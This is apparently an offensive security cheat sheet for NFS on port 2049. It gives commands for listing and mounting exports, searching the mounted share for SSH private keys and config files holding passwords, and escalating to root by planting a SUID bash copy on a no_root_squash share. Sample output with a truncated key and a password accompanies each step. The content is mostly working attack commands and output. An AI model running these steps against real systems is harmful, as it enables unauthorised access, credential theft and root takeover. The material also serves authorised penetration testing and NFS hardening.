# NFS (2049)

### Show exports

```bash
showmount -e $IP
```

> List NFS shares

**Why:** Find mountable shares

<details>
<summary>Example Output</summary>

```
showmount -e 10.10.10.5
/home/backup  *(rw,no_root_squash)
/var/www      *(ro)
(no_root_squash = privesc possible)
```
</details>

---

### Mount share

```bash
mkdir /tmp/nfs
mount -t nfs $IP:/<share> /tmp/nfs
```

> Mount and browse

**Why:** Full file access

<details>
<summary>Example Output</summary>

```
mkdir /tmp/nfs
mount -t nfs 10.10.10.5:/home/backup /tmp/nfs
ls /tmp/nfs/
  .ssh/  documents/  notes.txt
(Full access to user's home directory)
```
</details>

---

### Check for SSH keys

```bash
ls -la /tmp/nfs/home/*/.ssh/
```

> Private keys

**Why:** Instant SSH access

<details>
<summary>Example Output</summary>

```
find / -name id_rsa 2>/dev/null
/home/admin/.ssh/id_rsa

cat /home/admin/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA...
(Copy to attacker, chmod 600, ssh -i)
```
</details>

---

### Check for sensitive files

```bash
find /tmp/nfs -name '*.conf' -o -name '*.txt' -o -name '*.bak'
```

> Config files, backups

**Why:** Passwords in config files

<details>
<summary>Example Output</summary>

```
find /tmp/nfs -name '*.conf' -o -name '*.txt'
/tmp/nfs/notes.txt: 'DB password: MySQLr00t!'
/tmp/nfs/.ssh/id_rsa: -----BEGIN RSA PRIVATE KEY-----
```
</details>

---

### Check permissions / no_root_squash

```bash
If no_root_squash: create SUID binary on share
```

> Privesc via NFS

**Why:** Write SUID shell, execute on target

<details>
<summary>Example Output</summary>

```
cat /etc/exports shows: no_root_squash

On attacker as root:
cp /bin/bash /tmp/nfs/rootbash
chmod +s /tmp/nfs/rootbash

On target:
/home/backup/rootbash -p
# whoami
root
```
</details>

---
